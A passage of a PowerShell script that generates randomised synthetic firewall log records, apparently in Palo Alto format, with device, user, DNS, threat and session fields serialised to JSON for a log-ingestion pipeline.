        } else { Pick @("alert","block","block-ip","block-url","random-drop","sinkhole") }

        $rawPayload = @{
            EventId         = $evtId
            Vendor          = "FwVendor1"
            Severity        = $sev
            SeverityNum     = Get-SeverityNum $sev
            DeviceName      = $dev.Name
            DeviceIP        = $dev.IP
            DeviceOS        = $dev.OS
            DeviceSite      = $dev.Site
            UserId          = $user.Id
            UserName        = $user.Name
            UserDept        = $user.Dept
            UserPriv        = $user.Priv
            SourceIP        = if ((RandInt 0 1) -eq 0) { $dev.IP } else { $extIP }
            DestIP          = Get-RandomExtIP
            Action          = $action
            LogType         = $logType
            Subtype         = switch ($logType) {
                "THREAT"     { Pick @("vulnerability","spyware","virus","wildfire-virus","url","file","data") }
                "URL"        { "url" }
                "WILDFIRE"   { "wildfire" }
                "DECRYPTION" { Pick @("ssl","ssh") }
                default      { "end" }
            }
            ThreatName      = if ($logType -in @("THREAT","WILDFIRE")) { Pick $threatNames } else { $null }
            ThreatId        = if ($logType -eq "THREAT") { RandInt 10000 99999 } else { $null }
            URLCategory     = if ($logType -in @("URL","THREAT")) { Pick $urlCategories } else { $null }
            URL             = if ($logType -eq "URL") {
                                  $paDns = if ((RandInt 0 4) -eq 0) { Get-ThreatDnsRecord } elseif ((RandInt 0 2) -eq 0) { Get-ConsumerDnsRecord } else { Get-CorporateDnsRecord }
                                  "https://$($paDns.FQDN)$(Pick @('','/index.html','/api/v1/data','/upload','/signin'))"
                              } else { $null }
            DnsQueryFQDN    = if ($logType -in @("DNS","URL")) {
                                  $paDns2 = if ((RandInt 0 4) -eq 0) { Get-ThreatDnsRecord } elseif ((RandInt 0 1) -eq 0) { Get-ConsumerDnsRecord } else { Get-CorporateDnsRecord }
                                  $paDns2.FQDN
                              } else { $null }
            DnsResponseIP   = if ($logType -in @("DNS","URL")) { $paDns2.IP } else { $null }
            DnsRType        = if ($logType -in @("DNS","URL")) { $paDns2.RType } else { $null }
            DnsTTL          = if ($logType -in @("DNS","URL")) { $paDns2.TTL } else { $null }
            DnsCategory     = if ($logType -in @("DNS","URL")) { $paDns2.Category } else { $null }
            DnsIsConsumer   = if ($logType -in @("DNS","URL")) { $paDns2.Consumer } else { $null }
            DnsThreat       = if ($logType -eq "DNS" -and (RandInt 0 5) -eq 0) { $true } else { $false }
            WildfireVerdict = if ($logType -eq "WILDFIRE") { Pick $wildfireVerdict } else { $null }
            AuthEvent       = if ($logType -eq "AUTH") { Pick $authEvents } else { $null }
            SrcZone         = $zone
            DstZone         = Pick ($zones | Where-Object { $_ -ne $zone })
            App             = $app
            Rule            = $rule
            Protocol        = Pick @("tcp","udp","icmp","icmpv6","esp","ah")
            SrcPort         = $sport
            DstPort         = $dport
            BytesIn         = RandInt 64 5000000
            BytesOut        = RandInt 64 500000
            PktsIn          = RandInt 1 5000
            PktsOut         = RandInt 1 1000
            SessionId       = RandInt 100000 999999
            RepeatCount     = RandInt 1 10
            NAT_SrcIP       = "10.0.0.$(RandInt 1 254)"
            Serial          = "PA-VM-$($dev.Name)"
            VSYS            = "vsys1"
            DecryptReason   = if ($logType -eq "DECRYPTION") { Pick @("cert-error","unsupported-version","exclude-rule","policy-deny") } else { $null }
        } | ConvertTo-Json -Compress

        $records += @{
            TimeGenerated = Get-IsoTs $ts
            RawData       = $rawPayload
            SourceVendor  = "FwVendor1"
            FileName      = "pan-$($logType.ToLower())-$($ts.ToString('yyyyMMdd')).log"
        }
    }
    return $records
}

